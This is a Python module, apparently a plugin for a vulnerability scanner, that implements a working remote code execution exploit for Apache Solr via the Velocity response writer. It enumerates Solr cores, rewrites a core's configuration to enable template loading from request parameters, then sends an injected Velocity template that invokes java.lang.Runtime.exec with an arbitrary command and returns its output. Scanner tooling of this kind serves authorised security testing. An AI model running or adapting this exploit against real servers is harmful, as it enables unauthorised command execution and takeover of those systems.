# -*- coding:utf-8 -*-
# Apache Solr Velocity模板远程执行

import json

from .. import fileUtil
from ServiceScanModel.models import ServiceScan
from vulscan_Project.requestClass import Requests

config_data = {
    "update-queryresponsewriter": {
        "startup": "lazy",
        "name": "velocity",
        "class": "solr.VelocityResponseWriter",
        "template.base.dir": "",
        "solr.resource.loader.enabled": "true",
        "params.resource.loader.enabled": "true"
    }
}


class POC:

    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil = Requests(service.cookies)

    def get_core(self, url):
        try:
            resp = self.requestUtil.get(url + "/solr/admin/cores?_=1626521816720&indexInfo=false&wt=json").json()
            dbs = list(resp["status"].keys())
            return dbs
        except:
            return False

    def set_config(self, url, db):
        try:
            resp = self.requestUtil.post(url + f"/solr/{db}/config", header={"Content-Type": "application/json"},
                                    data=json.dumps(config_data))
            if '"status":0,' in resp.text:
                return db
            else:
                return False
        except:
            return False

    def rce(self, url, db, cmd="whoami"):
        resp = self.requestUtil.get(
            f'{url}/solr/{db}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x="")+%23set($rt=$x.class.forName("java.lang.Runtime"))+%23set($chr=$x.class.forName(\'java.lang.Character\'))+%23set($str=$x.class.forName("java.lang.String"))+%23set($ex=$rt.getRuntime().exec("{cmd}"))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"')
        if resp.status_code == 200 and not "responseHeader" in resp.text:
            print(resp.text)
            return resp.text.strip("0 ").strip('\"')

    def fingerprint(self):
        try:
            if self.service.url and "solr" in self.service.title.lower():
                return True
            return True
        except:
            return False

    def poc(self):
        try:
            if True:
                dbs = self.get_core(self.service.url)
                valid_db = False
                for db in dbs:
                    valid_db = self.set_config(self.service.url, db)
                    if valid_db:
                        break
                if valid_db:
                    result = self.rce(self.service.url, db=valid_db)
                    if result:
                        return (["Apache Solr Velocity模板远程执行", "当前用户: %s" % result], valid_db)
        except:
            return []
